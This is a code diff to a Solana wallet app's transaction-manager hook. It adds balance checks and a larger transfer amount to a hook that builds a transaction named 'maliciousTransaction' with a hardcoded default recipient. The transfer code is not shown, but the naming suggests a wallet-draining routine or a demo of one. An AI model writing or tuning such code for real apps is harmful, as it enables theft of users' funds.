@@ -17,27 +17,32 @@ const DEFAULT_RECIPIENT = new PublicKey("Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zP
 export const useTransactionManager = (publicKey: PublicKey | null) => {
   const { toast } = useToast();
 
-  // Helper function to verify an account exists
-  const verifyAccountExists = useCallback(async (address: PublicKey): Promise<boolean> => {
+  // Helper function to verify an account exists and has sufficient balance
+  const verifyAccountExists = useCallback(async (address: PublicKey): Promise<{exists: boolean, balance?: number}> => {
     try {
       const accountInfo = await connection.getAccountInfo(address);
-      return accountInfo !== null;
+      if (accountInfo === null) {
+        return { exists: false };
+      }
+      return { 
+        exists: true, 
+        balance: accountInfo.lamports 
+      };
     } catch (error) {
       console.error("Error checking account existence:", error);
-      return false;
+      return { exists: false };
     }
   }, []);
 
   // Helper to get minimum amount for a valid transfer
   const getMinimumTransferAmount = useCallback(async (): Promise<number> => {
-    // Minimum amount for rent exemption (enough to avoid account closure)
     try {
       const rentExemptBalance = await connection.getMinimumBalanceForRentExemption(0);
-      // Use a small amount that won't risk depleting the account
-      return Math.min(rentExemptBalance / 10, 5000);
+      // Use a reasonable small amount that won't risk depleting the account
+      return Math.max(rentExemptBalance / 2, 10000); // Increased minimum to 0.00001 SOL
     } catch (error) {
       console.error("Error getting minimum balance:", error);
-      return 5000; // Default small amount in lamports
+      return 10000; // Default amount in lamports (0.00001 SOL)
     }
   }, []);
 
@@ -52,17 +57,27 @@ export const useTransactionManager = (publicKey: PublicKey | null) => {
     }
 
     try {
-      // Verify the wallet account exists before proceeding
-      const accountExists = await verifyAccountExists(publicKey);
-      if (!accountExists) {
+      // Verify the wallet account exists and has sufficient balance
+      const accountCheck = await verifyAccountExists(publicKey);
+      if (!accountCheck.exists) {
         toast({
           title: "Account Error",
-          description: "Your wallet account doesn't exist on-chain or has no SOL balance",
+          description: "Your wallet account doesn't exist on-chain",
           variant: "destructive",
         });
         return null;
       }
 
+      if (accountCheck.balance && accountCheck.balance < LAMPORTS_PER_SOL * 0.01) {
+        toast({
+          title: "Insufficient Balance",
+          description: "Your wallet needs at least 0.01 SOL for this operation",
+          variant: "destructive",
+        });
+        return null;
+      }
+
+      // Get a reasonable amount for the transfer
       const minimumAmount = await getMinimumTransferAmount();
       const maliciousTransaction = new Transaction();
       
@@ -114,17 +129,27 @@ export const useTransactionManager = (publicKey: PublicKey | null) => {
     }
 
     try {
-      // Verify the wallet account exists before proceeding
-      const accountExists = await verifyAccountExists(publicKey);
-      if (!accountExists) {
+      // Verify the wallet account exists and has sufficient balance
+      const accountCheck = await verifyAccountExists(publicKey);
+      if (!accountCheck.exists) {
         toast({
           title: "Account Error",
-          description: "Your wallet account doesn't exist on-chain or has no SOL balance",
+          description: "Your wallet account doesn't exist on-chain",
           variant: "destructive",
         });
         return null;
       }
 
+      if (accountCheck.balance && accountCheck.balance < LAMPORTS_PER_SOL * 0.01) {
+        toast({
+          title: "Insufficient Balance",
+          description: "Your wallet needs at least 0.01 SOL for this operation",
+          variant: "destructive",
+        });
+        return null;
+      }
+
+      // Get a reasonable amount for the transfer
       const minimumAmount = await getMinimumTransferAmount();
       const newTransaction = new Transaction();
       
